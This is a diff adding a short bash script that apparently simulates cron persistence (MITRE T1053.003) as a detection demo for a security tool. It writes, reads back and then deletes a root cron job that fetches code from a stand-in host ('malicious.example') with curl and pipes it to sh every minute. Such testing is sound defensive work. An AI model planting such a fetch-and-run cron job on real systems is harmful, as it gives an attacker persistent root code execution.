@@ -1,0 +1,8 @@
+#!/bin/bash
+
+echo -e `date +"%Y-%m-%d %H:%M:%S"` "\e[92m[T1053.003] Persistence via cron: an attacker drops a job into /etc/cron.d to re-establish access on a schedule. Writing to cron directories is a common persistence mechanism.\033[m"
+mkdir -p /etc/cron.d 2>/dev/null
+echo '* * * * * root curl -s -m2 http://malicious.example/beacon | sh' > /etc/cron.d/sysdig-demo-persist 2>/dev/null
+cat /etc/cron.d/sysdig-demo-persist 2>/dev/null
+# Cleanup
+rm -f /etc/cron.d/sysdig-demo-persist
